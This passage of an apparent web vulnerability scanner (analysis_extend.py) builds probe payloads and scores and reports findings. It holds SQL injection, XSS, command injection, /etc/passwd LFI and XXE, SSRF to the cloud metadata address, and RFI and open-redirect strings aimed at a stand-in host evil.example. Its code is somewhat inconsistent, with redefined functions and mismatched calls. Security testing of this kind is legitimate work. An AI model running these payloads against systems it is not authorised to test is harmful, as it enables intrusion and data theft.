            res = analysis_bypass.detect_edge_origin(headers, dns_hints)  # type: ignore
            if isinstance(res, dict):
                record["edge"] = bool(res.get("edge"))
                record["waf_source"] = res.get("waf_source")
                return
        except Exception as e:
            log.warning("detect_edge_origin failed for URL=%s: %r", record.get("url"), e)

    # Fallback: TTL + header hints
    ttl = _safe_int(dns_hints.get("ttl"))
    cf = "cf-ray" in {k.lower() for k in headers.keys()}
    ak = any(h in {k.lower() for k in headers.keys()} for h in ("akamai-ghost", "x-akamai-request-id"))
    edge = (ttl and ttl <= 120) and (cf or ak)
    record["edge"] = bool(edge)
    if not headers:
        record.setdefault("waf_source", None)
        return
    record["waf_source"] = "edge" if edge else ("origin" if (headers.get("server") or "").lower() not in ("", "cloudflare", "akamai", "fastly") else "none")

# ──────────────────────────────────────────────────────────────────────────────
# Helpers — payload crafting, mapping, scoring

def _build_payloads_for_record(record: Dict[str, Any], params: Dict[str, str]) -> Dict[str, Any]:
    """
    Construct a multi-family payload set tailored to the record's params and content-type.
    Only include families relevant to present params to reduce noise/FPs.
    """
    url = record.get("url") or ""
    ctype = (record.get("content_type") or "").lower()
    present = {k.lower() for k in params.keys()}

    payloads: Dict[str, Any] = {}

    # SQLi on typical params
    for p in present.intersection({"id", "uid", "user", "q", "search"}):
        payloads.setdefault("SQLI", []).extend([
            {"variant": "boolean_true", "param": p, "value": "' OR '1'='1", "markers": ["sql", "syntax", "mysql", "postgres"]},
            {"variant": "boolean_false", "param": p, "value": "' AND '1'='0", "markers": ["sql", "syntax", "mysql", "postgres"]},
            {"variant": "time_delay", "param": p, "value": "'; WAITFOR DELAY '0:0:3'--", "markers": ["timeout", "delay"]},
        ])

    # XSS reflection on any text-like parameter
    for p in present:
        payloads.setdefault("XSS", []).extend([
            {"variant": "reflect_basic", "param": p, "value": "<xss>", "markers": ["<xss>"]},
            {"variant": "reflect_event", "param": p, "value": '"><img src=x onerror=1>', "markers": ["onerror", "<img"]},
        ])

    # IDOR hints: attempt numeric shift (won't execute HTTP here; ab_compare decides)
    for p in present.intersection({"id", "uid", "user"}):
        payloads.setdefault("IDOR", []).extend([
            {"variant": "inc", "param": p, "value": "__ID+1__", "markers": ["idor", "ownership"]},
            {"variant": "dec", "param": p, "value": "__ID-1__", "markers": ["idor", "ownership"]},
        ])

    # SSRF/Open Redirect on url-like params
    for p in present.intersection({"url", "redirect", "next", "target", "callback"}):
        payloads.setdefault("SSRF", []).extend([
            {"variant": "internal", "param": p, "value": "http://169.254.169.254/", "markers": ["metadata", "ssrf"]},
            {"variant": "localhost", "param": p, "value": "http://127.0.0.1:80/", "markers": ["loopback", "ssrf"]},
        ])
        payloads.setdefault("OPENREDIR", []).extend([
            {"variant": "abs_http", "param": p, "value": "http://evil.example/", "markers": ["redirect"]},
            {"variant": "proto_less", "param": p, "value": "//evil.example/", "markers": ["redirect"]},
            {"variant": "slashes", "param": p, "value": "/\\/\\/evil.example/", "markers": ["redirect"]},
        ])

    # RCE/Command Injection on cmd-like params
    for p in present.intersection({"cmd", "exec", "command"}):
        payloads.setdefault("RCE", []).extend([
            {"variant": "shell_sleep", "param": p, "value": ";sleep 3", "markers": ["delay"]},
            {"variant": "pipe_id", "param": p, "value": "|id", "markers": ["uid", "gid"]},
        ])

    # LFI/RFI on file/path/template-like params
    for p in present.intersection({"file", "path", "doc", "template"}):
        payloads.setdefault("LFI", []).extend([
            {"variant": "etc_passwd", "param": p, "value": "../../etc/passwd", "markers": ["root:x:"]},
            {"variant": "proc_self", "param": p, "value": "../../proc/self/cmdline", "markers": ["proc"]},
        ])
        payloads.setdefault("RFI", []).extend([
            {"variant": "http_include", "param": p, "value": "http://evil.example/shell.txt", "markers": ["include", "http"]},
        ])

    # XXE for XML content-types
    if "xml" in ctype:
        payloads.setdefault("XXE", []).extend([
            {"variant": "local_file", "data": """<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>""", "markers": ["root:x:"]},
        ])

    # DESERIAL on suspect params (base64-like)
    for p in present:
        if re.fullmatch(r"[A-Za-z0-9+/=_\-\.]{24,}", params.get(p, "")):
            payloads.setdefault("DESERIAL", []).append(
                {"variant": "flip_bit", "param": p, "value": "__BITFLIP__", "markers": ["deserialize", "exception"]}
            )

    # JWT checks if Authorization Bearer present
    authz = _header_lookup(record.get("headers") or {}, "Authorization")
    if authz and "bearer " in authz.lower():
        payloads.setdefault("JWT", []).extend([
            {"variant": "alg_none", "header": "Authorization", "value": "__JWT_ALG_NONE__", "markers": ["alg=none"]},
            {"variant": "kid_inject", "header": "Authorization", "value": "__JWT_KID_INJECT__", "markers": ["kid"]},
        ])

    # CORS/WEAKHDRS handled via header_facts (no active payloads here)

    # MASSASSIGN for JSON API
    if "json" in ctype or "/api" in url.lower():
        payloads.setdefault("MASSASSIGN", []).extend([
            {"variant": "isAdmin_true", "json_extra": {"isAdmin": True}, "markers": ["role", "admin"]},
            {"variant": "role_elev", "json_extra": {"role": "admin"}, "markers": ["role", "admin"]},
        ])

    return payloads


def _aggregate_ab_confidence(res: Dict[str, Any], record: Dict[str, Any]) -> float:
    """
    Aggregate family/variant results into a single 0..1 ab_confidence value.
    Enforce multi-probe logic: require at least 2 coherent signals for HIGH-ish values.
    """
    fam_scores: List[float] = []
    coherent_boost = 0.0

    for fam, variants in res.items():
        if not isinstance(variants, dict):
            continue
        v_scores = []
        saw_status = False
        saw_reflect = False
        for vname, vres in variants.items():
            if not isinstance(vres, dict):
                continue
            ds = abs(int(vres.get("delta_status") or 0))
            dz = abs(int(vres.get("delta_size") or 0))
            refl = bool(vres.get("reflect"))
            mark = vres.get("markers") or []
            conf = _safe_float(vres.get("confidence"))
            # Basic family confidence
            sc = conf
            # Strengthen when we have both status change and reflection/markers
            if ds >= 1 and (refl or _has_sql_marker(mark)):
                sc = max(sc, 0.7)
            if dz >= 1024 and refl:
                sc = max(sc, 0.65)
            v_scores.append(sc)
            saw_status = saw_status or (ds >= 1)
            saw_reflect = saw_reflect or refl

        if v_scores:
            fam_sc = max(v_scores)
            # Multi-probe corroboration
            if saw_status and saw_reflect:
                fam_sc = min(1.0, fam_sc + 0.1)
                coherent_boost = max(coherent_boost, 0.05)
            fam_scores.append(fam_sc)

    if not fam_scores:
        return 0.0
    base = max(fam_scores)
    return min(1.0, base + coherent_boost)


def _collect_reflections(evidence_bag: Dict[str, Any]) -> List[str]:
    refs: List[str] = []
    for fam, variants in (evidence_bag or {}).items():
        if not isinstance(variants, dict):
            continue
        for vname, vres in variants.items():
            if isinstance(vres, dict) and vres.get("reflect"):
                # we expect vres["reflect_ctx"] or payload echoed value
                echoed = vres.get("echo") or vres.get("payload") or "<reflected>"
                refs.append(str(echoed))
    return refs


def _validate_reflection_context(record: Dict[str, Any], reflections: List[str]) -> str:
    """
    Classify reflection context: 'critical' if in <script> or JS attribute; 'low' otherwise.
    """
    body = (record.get("body_snippet") or record.get("body") or "").lower()
    critical = any((
        "<script" in body,
        "onerror=" in body,
        "onclick=" in body,
        "onload=" in body,
    ))
    if critical:
        return "critical"
    return "low"


def _markers_to_reasons(record: Dict[str, Any], bag: Dict[str, Any]) -> None:
    # Map known families to standard reason codes based on evidence presence/markers
    fam_map = {
        "OPENREDIR": RC["W_OPENREDIR"],
        "SSRF": RC["W_SSRF"],
        "LFI": RC["W_LFI"],
        "RCE": RC["E_RCE_ERR"],
    }
    added = set()
    for fam, code in fam_map.items():
        if fam in bag and isinstance(bag[fam], dict) and bag[fam]:
            _add_reason(record, code)
            added.add(code)
    # SQL error evidence handled elsewhere; reflection handled too


def _map_header_facts_to_reasons(record: Dict[str, Any], facts: Dict[str, Any], headers: Dict[str, str]) -> None:
    # CORS
    cors = (facts.get("cors_facts") or {}) if isinstance(facts, dict) else {}
    if cors:
        if cors.get("allow_any_origin") and cors.get("allow_credentials"):
            _add_reason(record, RC["C_CORS_CRED"])
        elif cors.get("allow_any_origin"):
            _add_reason(record, RC["C_CORS_ANY"])
    # Security headers
    sh = (facts.get("sec_headers") or {}) if isinstance(facts, dict) else {}
    if sh is not None:
        if not sh.get("hsts"):
            _add_reason(record, RC["H_HSTS_MISS"])
        if not sh.get("csp"):
            _add_reason(record, RC["H_CSP_MISS"])
        if not sh.get("xfo"):
            _add_reason(record, RC["H_XFO_MISS"])
    # Cookie facts
    ck = (facts.get("cookie_facts") or {}) if isinstance(facts, dict) else {}
    if ck and ck.get("unsafe"):
        _add_reason(record, RC["H_COOKIE_UNSAFE"])
    # Cache
    cache = (facts.get("cache_facts") or {}) if isinstance(facts, dict) else {}
    if cache and cache.get("is_public"):
        _add_reason(record, RC["H_CACHE_PUBLIC"])
    # CT mismatch (if any)
    if isinstance(facts, dict) and facts.get("ct_mismatch"):
        _add_reason(record, RC["CT_MISMATCH"])


def _reasons_strength(codes: List[str]) -> float:
    if not codes:
        return 0.0
    strong = {RC["E_SQL_ERR"], RC["E_REFLECT_CRIT"], RC["W_SSRF"], RC["W_LFI"], RC["E_RCE_ERR"]}
    medium = {RC["C_CORS_CRED"], RC["H_HSTS_MISS"], RC["H_CSP_MISS"], RC["H_XFO_MISS"], RC["W_OPENREDIR"], RC["H_COOKIE_UNSAFE"]}
    s = sum(1 for c in codes if c in strong)
    m = sum(1 for c in codes if c in medium)
    return min(1.0, 0.5 * (s > 0) + 0.35 * (m > 0) + 0.15 * (len(codes) > 3))


# ──────────────────────────────────────────────────────────────────────────────
# Fallbacks for batch snapshots

def _fallback_quality_snapshot(rows: List[Dict[str, Any]]) -> Dict[str, Any]:
    alln = len(rows)
    high = sum(1 for r in rows if (r.get("confidence") == "HIGH"))
    med = sum(1 for r in rows if (r.get("confidence") == "MED"))
    low = alln - high - med
    verdict = "GOOD"
    if high / max(1, alln) > 0.10:
        verdict = "POOR"
    elif high / max(1, alln) >= 0.05:
        verdict = "FAIR"
    # Reliability
    ab_ok = sum(1 for r in rows if _safe_float(r.get("ab_confidence")) >= 0.6)
    edge_only = sum(1 for r in rows if (r.get("edge") is True and (r.get("waf_source") == "edge")))
    ct_mismatch = sum(1 for r in rows if RC["CT_MISMATCH"] in (r.get("reason_codes") or []))
    # Latency snapshot (rough)
    latencies = [ _safe_int(r.get("lat_p95") or r.get("latency") or 0) for r in rows ]
    p95 = int(_percentile(latencies, 95)) if latencies else 0
    iqr = int(_iqr(latencies)) if latencies else 0
    return {
        "totals": {"all": alln, "high": high, "medium": med, "low": low},
        "verdict": verdict,
        "signals": {"strong_flags": "MED" if high >= 3 else "LOW", "api_auth_surface": "HIGH" if any("/api" in (r.get("url") or "").lower() for r in rows) else "LOW", "static_surface": "LOW"},
        "reliability": {"ab_corroborated": f"{ab_ok}/{max(1, min(10, alln))}", "edge_only": edge_only, "ct_mismatch": ct_mismatch},
        "latency": {"p95": p95, "iqr": iqr, "capped": any(r.get("lat_is_capped") for r in rows)},
        "notes": {"seeds": _seed_paths(rows)},
    }


def _fallback_family_sources(rows: List[Dict[str, Any]]) -> Dict[str, Any]:
    alln = len(rows)
    kb = sum(1 for r in rows if (r.get("family_source") == "KB"))
    ai = sum(1 for r in rows if (r.get("family_source") == "AI"))
    kb_pct = kb / max(1, alln)
    ai_pct = ai / max(1, alln)
    return {"kb_pct": kb_pct, "ai_pct": ai_pct}

# ──────────────────────────────────────────────────────────────────────────────
# Minor utilities

def _ensure_lists(r: Dict[str, Any]) -> None:
    if "reason_codes" not in r or not isinstance(r.get("reason_codes"), list):
        r["reason_codes"] = []


def _add_reason(record: Dict[str, Any], code: str) -> None:
    record.setdefault("reason_codes", [])
    if code not in record["reason_codes"]:
        record["reason_codes"].append(code)


def _safe_int(x: Any) -> int:
    try:
        return int(x)
    except Exception:
        return 0


def _safe_float(x: Any) -> float:
    try:
        return float(x)
    except Exception:
        return 0.0


def _percentile(data: List[int], p: float) -> float:
    if not data:
        return 0.0
    data = sorted(data)
    k = (len(data) - 1) * p / 100.0
    f = math.floor(k)
    c = math.ceil(k)
    if f == c:
        return float(data[int(k)])
    d0 = data[f] * (c - k)
    d1 = data[c] * (k - f)
    return float(d0 + d1)


def _iqr(data: List[int]) -> float:
    if len(data) < 4:
        return 0.0
    q3 = _percentile(data, 75.0)
    q1 = _percentile(data, 25.0)
    return float(q3 - q1)


def _extract_params(record: Dict[str, Any]) -> Dict[str, str]:
    # Prefer parsed `params` if present; else parse from URL
    params = {}
    raw = record.get("params")
    if isinstance(raw, dict):
        params.update({str(k): str(v) for k, v in raw.items()})
    elif isinstance(raw, list):
        for k, v in raw:
            params[str(k)] = str(v)
    url = record.get("url") or ""
    for k, v in parse_qsl(urlparse(url).query, keep_blank_values=True):
        params.setdefault(k, v)
    return params


def _has_sql_marker(markers: List[str]) -> bool:
    S = {m.lower() for m in markers or []}
    return bool(S.intersection({"sql", "mysql", "postgres", "syntax", "oracle"}))


def _header_lookup(headers: Dict[str, str], key: str) -> Optional[str]:
    low = key.lower()
    for k, v in (headers or {}).items():
        if str(k).lower() == low:
            return str(v)
    return None


def _is_sensitive_path(record: Dict[str, Any]) -> bool:
    u = (record.get("url") or "").lower()
    return any(seg in u for seg in ("/login", "/account", "/auth", "/api", "/export", "/callback"))


def _simple_cookie_cache_check(headers: Dict[str, str]) -> List[str]:
    issues = []
    set_cookie = " ".join([v for k, v in headers.items() if k.lower() == "set-cookie"])
    cache = " ".join([v for k, v in headers.items() if k.lower() == "cache-control"])
    # Cookie unsafe if missing HttpOnly/Secure on session-like names
    if re.search(r"(session|auth|token|jwt)=", set_cookie, flags=re.I):
        if not re.search(r"httponly", set_cookie, flags=re.I) or not re.search(r"secure", set_cookie, flags=re.I):
            issues.append(RC["H_COOKIE_UNSAFE"])
    # Cache public on sensitive endpoints
    if re.search(r"\bpublic\b", cache, flags=re.I):
        issues.append(RC["H_CACHE_PUBLIC"])
    return issues


def _sig_block(r: Dict[str, Any]) -> Dict[str, Any]:
    return {"path": r.get("sig_path") or (urlparse(r.get("url") or "").path or "/"),
            "params": r.get("sig_params") or [],
            "key": r.get("sig_key")}


def _evidence_block(r: Dict[str, Any]) -> str:
    ev = r.get("ab_evidence") or {}
    # Summarize key signals
    parts = []
    # Prefer SQLI / reflected for example lines if present
    for fam in ("SQLI", "XSS", "IDOR", "SSRF", "OPENREDIR", "LFI", "RCE"):
        v = ev.get(fam)
        if isinstance(v, dict) and v:
            # pick best variant
            best = None
            best_sc = -1.0
            for vn, vr in v.items():
                sc = _safe_float(vr.get("confidence"))
                if sc > best_sc:
                    best_sc = sc
                    best = vr
            if best:
                ds = int(best.get("delta_status") or 0)
                dz = int(best.get("delta_size") or 0)
                refl = "YES" if best.get("reflect") else "NO"
                mark = "/".join(best.get("markers") or [])[:40]
                parts.append(f"{fam}: Δstatus={ds:+d}, Δsize={dz:+d}B, reflect={refl}, mk={mark}")
    return " | ".join(parts) if parts else "—"


def _reasons_block(r: Dict[str, Any]) -> str:
    return " | ".join(r.get("reason_codes") or []) or "—"


def _next_block(r: Dict[str, Any]) -> str:
    fam = (r.get("family") or "").upper()
    if fam == "API" and RC["E_SQL_ERR"] in (r.get("reason_codes") or []):
        return "UNION/boolean tests, param tampering on id"
    if RC["C_CORS_CRED"] in (r.get("reason_codes") or []):
        return "CSRF checks, session fixation"
    if RC["W_OPENREDIR"] in (r.get("reason_codes") or []):
        return "External redirect to attacker URL + token capture"
    return ""


def _context_block(r: Dict[str, Any]) -> str:
    psi = f"PSI={_safe_float(r.get('psi_score')):.2f} hits={{{','.join(r.get('psi_hits') or [])}}}"
    edge = f"Edge={str(bool(r.get('edge'))).upper()}"
    waf = r.get("waf") or r.get("waf_source") or "None"
    ttl = r.get("dns_ttl")
    ttl_sfx = f" (TTL={ttl}s)" if ttl else ""
    return f"{psi}  {edge}{ttl_sfx}  WAF={waf}"


def _flags_weight(r: Dict[str, Any]) -> float:
    flags = (r.get("flags") or "") + " " + " ".join(r.get("reason_codes") or [])
    f = flags.upper()
    w = 0.0
    for key, inc in (("SQLI", 1.0), ("RCE", 1.0), ("SSRF", 0.9), ("IDOR", 0.7), ("OPENREDIR", 0.4), ("XSS", 0.5)):
        if key in f:
            w += inc
    return w


def _family_weight(r: Dict[str, Any]) -> float:
    fam = (r.get("family") or "").upper()
    return 1.0 if fam in {"API", "AUTH"} else 0.4


def _seed_paths(rows: List[Dict[str, Any]]) -> List[str]:
    seeds = []
    for pat in ("/api", "/login", "/admin", "/callback", "/export", "/search"):
        if any(pat in (r.get("url") or "").lower() for r in rows):
            seeds.append(pat + "/*")
    return seeds[:6]


def _pct(n: int, d: int) -> str:
    if d <= 0: return "0.0%"
    return f"{(100.0 * n / d):.1f}%"

# (continued) analysis_extend.py
# ──────────────────────────────────────────────────────────────────────────────
# Extra reason codes for additional high-impact families
RC.update({
    "W_XXE": "W-XXE",
    "W_DESERIAL": "W-DESERIAL",
    "W_JWT_WEAK": "W-JWT-WEAK",
    "W_MASSASSIGN": "W-MASSASSIGN",
})

# Map additional families to reasons when evidence present
_EXTRA_FAM_REASON = {
    "XXE": RC["W_XXE"],
    "DESERIAL": RC["W_DESERIAL"],
    "JWT": RC["W_JWT_WEAK"],
    "MASSASSIGN": RC["W_MASSASSIGN"],
}

# ──────────────────────────────────────────────────────────────────────────────
# Baseline refinement (optional): adjust AB confidence using local baseline

def refine_evidence_with_baseline(record: Dict[str, Any]) -> None:
    """
    Use baseline status/size when available to suppress noise in A/B evidence.
    If deltas are within baseline tolerance, dampen ab_confidence.
    """
    base_status = _safe_int(record.get("baseline_status") or record.get("status"))
    base_size = _safe_int(record.get("baseline_size") or record.get("size"))
    ab = record.get("ab_evidence") or {}
    if not isinstance(ab, dict) or not ab:
        return

    tolerance_bytes = max(128, int(0.03 * max(1, base_size)))  # 3% or 128B
    damped = False

    for fam, variants in ab.items():
        if not isinstance(variants, dict):
            continue
        for vn, vr in variants.items():
            if not isinstance(vr, dict):
                continue
            ds = abs(int(vr.get("delta_status") or 0))
            dz = abs(int(vr.get("delta_size") or 0))
            # If neither status nor size exceeds tolerance and no strong markers, mark as weak
            weak = (ds == 0 and dz <= tolerance_bytes and not vr.get("reflect"))
            if weak:
                # Tag variant as weak to inform renderers/debug
                vr["weak"] = True
                damped = True

    if damped:
        # Reduce AB confidence modestly (but not below a floor if other signals exist)
        current = _safe_float(record.get("ab_confidence"))
        floor = 0.15 if _reasons_strength(record.get("reason_codes") or []) > 0.3 else 0.0
        record["ab_confidence"] = max(floor, round(current * 0.7, 4))


# ──────────────────────────────────────────────────────────────────────────────
# Batch driver (apply all per-record enrichments + optional baseline refinement)

def apply_enrichment_to_rows(rows: List[Dict[str, Any]], kb: Optional[Dict[str, Any]] = None, features: Optional[Dict[str, Any]] = None) -> List[Dict[str, Any]]:
    """
    Enrich every row using enrich_record, then perform baseline refinement.
    """
    kb = kb or {}
    features = features or {}
    out: List[Dict[str, Any]] = []
    for r in rows or []:
        try:
            rr = enrich_record(r, kb=kb, features=features)
            # optional baseline refinement (if baseline fields are present)
            try:
                refine_evidence_with_baseline(rr)
            except Exception as e:
                log.warning("refine_evidence_with_baseline failed: %r", e)
            out.append(rr)
        except Exception as e:
            log.warning("enrich_record failed for URL=%s: %r", r.get("url"), e)
            out.append(r)
    return out


# ──────────────────────────────────────────────────────────────────────────────
# Family/Reason aggregation from evidence (cover remaining families)

def _markers_to_reasons(record: Dict[str, Any], bag: Dict[str, Any]) -> None:
    # Existing families
    fam_map = {
        "OPENREDIR": RC["W_OPENREDIR"],
        "SSRF": RC["W_SSRF"],
        "LFI": RC["W_LFI"],
        "RCE": RC["E_RCE_ERR"],
        "XXE": RC["W_XXE"],
        "DESERIAL": RC["W_DESERIAL"],
        "JWT": RC["W_JWT_WEAK"],
        "MASSASSIGN": RC["W_MASSASSIGN"],
    }
    for fam, code in fam_map.items():
        v = bag.get(fam)
        if isinstance(v, dict) and v:
            # consider at least one variant with confidence >= 0.5 or explicit marker
            strong_variant = any(_safe_float(vr.get("confidence")) >= 0.5 or vr.get("markers") for vr in v.values() if isinstance(vr, dict))
            if strong_variant:
                _add_reason(record, code)
    # SQL error evidence handled in extend_error_header_facts; reflection handled in extend_ab_evidence


# ──────────────────────────────────────────────────────────────────────────────
# Top-level report assembly helpers

# === PATCH 3B: assemble_report_sections safe =================================
def assemble_report_sections(*blocks):
    def _to_str(block):
        if block is None: return ""
        if isinstance(block, list): return "\n".join(str(x) for x in block if x is not None)
        return str(block)
    parts = []
    for b in blocks:
        s = _to_str(b).strip()
        if s: parts.append(s)
    return "\n".join(parts) + ("\n" if parts else "")
# ============================================================================ #


def render_full_results_table(rows: List[Dict[str, Any]], page: int = 1, per_page: int = 20) -> str:
    """
    ASCII fallback for the full results table.
    """
    if _of_render_table:
        try:
            return _of_render_table(rows, page=page, per_page=per_page)  # type: ignore
        except Exception as e:
            log.warning("external render_table failed: %r; using fallback", e)

    n = len(rows)
    if n == 0:
        return "No results.\n"
    start = max(0, (page - 1) * per_page)
    end = min(n, start + per_page)
    view = rows[start:end]

    lines = []
    lines.append("════════════════════════════════ FULL RESULTS (paged table) ═══════════════════════════════")
    header = (
        "---- ---- ------- ------ ------ -------- -------- ------------------ ---------- ------------------ -------------------- ------------------------------------ ----------------------------------------"
    )
    lines.append(header)
    lines.append(
        f"#    SEV  SCORE   METH   STAT   LAT(ms)  SIZE     TYPE               FAMILY    WAF                FLAGS                REASONS                             URL"
    )
    lines.append(header)

    for idx, r in enumerate(view, start=start + 1):
        sev = "HIGH" if r.get("confidence") == "HIGH" else "MED" if r.get("confidence") == "MED" else "LOW"
        score_pct = f"{int(round(100 * _safe_float(r.get('score'))))}%"
        meth = (r.get("method") or r.get("meth") or "GET")[:6]
        stat = str(r.get("status") or "-")[:6]
        lat = str(r.get("lat_p95") or r.get("latency") or "-")[:8]
        size = f"{_safe_int(r.get('size') or 0)/1024:.1f}KB"
        typ = (r.get("content_type") or r.get("type") or "-")[:18]
        fam = (r.get("family") or r.get("type") or "-")[:10]
        waf = (r.get("waf") or r.get("waf_source") or "-")[:18]
        flags = _flags_string(r)[:20]
        reasons = " ".join((r.get("reason_codes") or [])[:5])[:36]
        url = (r.get("url") or "")[:36]

        lines.append(
            f"{idx:<4} {sev:<4} {score_pct:<7} {meth:<6} {stat:<6} {lat:<8} {size:<8} {typ:<18} {fam:<10} {waf:<18} {flags:<20} {reasons:<36} {url}"
        )

    lines.append(header)
    return "\n".join(lines) + "\n"


def _flags_string(r: Dict[str, Any]) -> str:
    # Prefer record.flags if present, else derive from reasons/family
    existing = str(r.get("flags") or "").strip()
    if existing:
        return existing
    derived = []
    rc = " ".join(r.get("reason_codes") or [])
    for tag in ("+SQLI", "+XSS", "+IDOR", "+SSRF", "+OPENREDIR", "+RCE", "+LFI", "+XXE", "+DESERIAL", "+JWT", "+CORS", "+AUTH", "+MASSASSIGN", "+WEAKHDRS"):
        key = tag.strip("+")
        if key in rc or key in str(r.get("family") or "").upper():
            derived.append(tag)
    if not derived:
        if "/api" in (r.get("url") or "").lower():
            derived.append("+API")
        else:
            derived.append("+WEB")
    return " ".join(derived)


def render_full_ascii_report(rows: List[Dict[str, Any]], sections: Optional[Dict[str, Any]] = None, page: int = 1, per_page: int = 20) -> str:
    """
    Join all ASCII sections into a single report string.
    """
    sections = sections or {}
    cards = sections.get("cards") or []
    qgate = sections.get("quality_gate_snapshot") or {}
    famsrc = sections.get("family_sources_snapshot") or {}
    cookie_rows = sections.get("cookie_rows") or []

    parts = []
    parts.append(render_attackable_paths(cards))
    parts.append(render_quality_gate(qgate))
    parts.append(render_family_sources(famsrc))
    parts.append(render_cookie_audit(cookie_rows))
    parts.append(render_full_results_table(rows, page=page, per_page=per_page))
    return "\n".join(p.strip("\n") for p in parts if p)


# ──────────────────────────────────────────────────────────────────────────────
# High-level convenience: end-to-end pipeline from rows → ASCII

def process_and_render(rows: List[Dict[str, Any]], kb: Optional[Dict[str, Any]] = None, features: Optional[Dict[str, Any]] = None, output: Optional[Dict[str, Any]] = None, page: int = 1, per_page: int = 20) -> Dict[str, Any]:
    """
    One-call convenience:
      - enrich all rows
      - latency stats
      - negative controls
      - build cards + snapshots
      - produce ASCII
    Returns dict with 'rows','cards','snapshots','ascii'
    """
    features = features or {}
    output = output or {}

    # 1) per-record enrichment
    rows2 = apply_enrichment_to_rows(rows, kb=kb, features=features)

    # 2) batch stats/effects
    try:
        extend_latency_stats(rows2, features=features)
    except Exception as e:
        log.warning("extend_latency_stats failed: %r", e)
    try:
        extend_negative_controls(rows2)
    except Exception as e:
        log.warning("extend_negative_controls failed: %r", e)

    # 3) assemble sections
    sections = assemble_report_sections(rows2, output=output, features=features)

    # 4) ASCII
    ascii_report = render_full_ascii_report(rows2, sections=sections, page=page, per_page=per_page)

    return {
        "rows": rows2,
        "cards": sections.get("cards") or [],
        "quality_gate_snapshot": sections.get("quality_gate_snapshot") or {},
        "family_sources_snapshot": sections.get("family_sources_snapshot") or {},
        "cookie_rows": sections.get("cookie_rows") or [],
        "ascii": ascii_report,
    }


# ──────────────────────────────────────────────────────────────────────────────
# __all__ for explicit public API

__all__ = [
    # per-record
    "enrich_record",
    "extend_param_sensitivity",
    "extend_signature",
    "extend_error_header_facts",
    "extend_family_context",
    "extend_ab_evidence",
    "extend_confidence",
    "extend_cookie_cache_audit",
    "extend_edge_origin",
    "refine_evidence_with_baseline",
    # batch
    "apply_enrichment_to_rows",
    "extend_latency_stats",
    "extend_negative_controls",
    "extend_quality_metrics",
    "extend_family_sources",
    # top10 + renders
    "build_attackable_paths",
    "render_attackable_paths",
    "render_quality_gate",
    "render_family_sources",
    "render_cookie_audit",
    "render_full_results_table",
    "render_full_ascii_report",
    "process_and_render",
]
# (continued) analysis_extend.py
# ──────────────────────────────────────────────────────────────────────────────
# Feature-flag management and guarded enrichment (redefine enrich_record)
_CURRENT_FEATURES: Dict[str, Any] = {}

def set_features(features: Optional[Dict[str, Any]]) -> None:
    global _CURRENT_FEATURES
    _CURRENT_FEATURES = features or {}

def _feature(name: str, default: bool = True) -> bool:
    """
    Resolve feature flags from nested dictionaries commonly used in config.yaml:
      features: { name: true|false }
    Accepts dot-paths (e.g., "features.psi"). If not present, use default.
    """
    if not _CURRENT_FEATURES:
        return default
    # direct boolean
    if name in _CURRENT_FEATURES and isinstance(_CURRENT_FEATURES[name], bool):
        return bool(_CURRENT_FEATURES[name])
    # nested under 'features'
    feats = _CURRENT_FEATURES.get("features")
    if isinstance(feats, dict) and name in feats and isinstance(feats[name], bool):
        return bool(feats[name])
    # dotted path
    if "." in name:
        root, leaf = name.split(".", 1)
        node = _CURRENT_FEATURES.get(root)
        if isinstance(node, dict) and leaf in node and isinstance(node[leaf], bool):
            return bool(node[leaf])
    return default

# Save original enrichment steps to call from guarded version
def _call_safely(fn, *args, **kwargs):
    try:
        return fn(*args, **kwargs)
    except Exception as e:
        log.warning("%s failed: %r", getattr(fn, "__name__", "fn"), e)
        return None

def _enrich_record_impl(record: Dict[str, Any], kb: Optional[Dict[str, Any]] = None, features: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    Original enrichment pipeline (non-feature-gated).
    """
    record = dict(record or {})
    _ensure_lists(record)

    _call_safely(extend_param_sensitivity, record)
    _call_safely(extend_signature, record)
    _call_safely(extend_error_header_facts, record)
    _call_safely(extend_family_context, record, kb or {})
    _call_safely(extend_ab_evidence, record, features=features or {})
    _call_safely(extend_confidence, record, features=features or {})
    _call_safely(extend_cookie_cache_audit, record)
    _call_safely(extend_edge_origin, record)
    return record

def enrich_record(record: Dict[str, Any], kb: Optional[Dict[str, Any]] = None, features: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:  # type: ignore[override]
    """
    Feature-gated enrichment pipeline (redefines previous enrich_record).
    """
    set_features(features)
    rec = dict(record or {})
    _ensure_lists(rec)

    if _feature("psi", True):
        _call_safely(extend_param_sensitivity, rec)
    if _feature("signature", True):
        _call_safely(extend_signature, rec)
    if _feature("error_facts", True):
        _call_safely(extend_error_header_facts, rec)
    if _feature("family_ai", True) or _feature("family", True):
        _call_safely(extend_family_context, rec, kb or {})
    if _feature("ab_evidence", True):
        _call_safely(extend_ab_evidence, rec, features=features or {})
    if _feature("confidence", True):
        _call_safely(extend_confidence, rec, features=features or {})
    if _feature("cookie_cache_audit", True):
        _call_safely(extend_cookie_cache_audit, rec)
    if _feature("edge_origin", True):
        _call_safely(extend_edge_origin, rec)

    # Optional baseline refinement if flags say so
    if _feature("baseline_refine", True):
        _call_safely(refine_evidence_with_baseline, rec)

    return rec

# ──────────────────────────────────────────────────────────────────────────────
# Adapters for orchestrator integration (minimal touch points)

def attach_render_context_hook(record: Dict[str, Any], kb: Optional[Dict[str, Any]] = None, features: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    Thin hook intended to be called from orch_report.attach_render_context().
    Keeps backward compatibility: returns a *new* record dict with enriched fields.
    """
    return enrich_record(record, kb=kb, features=features)

def finalize_report_hook(rows: List[Dict[str, Any]], output: Optional[Dict[str, Any]] = None, features: Optional[Dict[str, Any]] = None, page: int = 1, per_page: int = 20) -> Dict[str, Any]:
    """
    Thin hook intended to be called from orch_report.main_orchestrator() after all rows exist.
    Applies batch stats, builds sections, and assembles ASCII (if needed).
    """
    features = features or {}
    output = output or {}

    if _feature("robust_latency", True):
        _call_safely(extend_latency_stats, rows, features=features)

    if _feature("negative_controls", True):
        _call_safely(extend_negative_controls, rows)

    sections = _call_safely(assemble_report_sections, rows, output, features) or {}
    ascii_report = _call_safely(render_full_ascii_report, rows, sections, page, per_page) or ""

    output.update({
        "attackable_cards": sections.get("cards") or [],
        "quality_gate_snapshot": sections.get("quality_gate_snapshot") or {},
        "family_sources_snapshot": sections.get("family_sources_snapshot") or {},
        "cookie_rows": sections.get("cookie_rows") or [],
        "ascii": ascii_report,
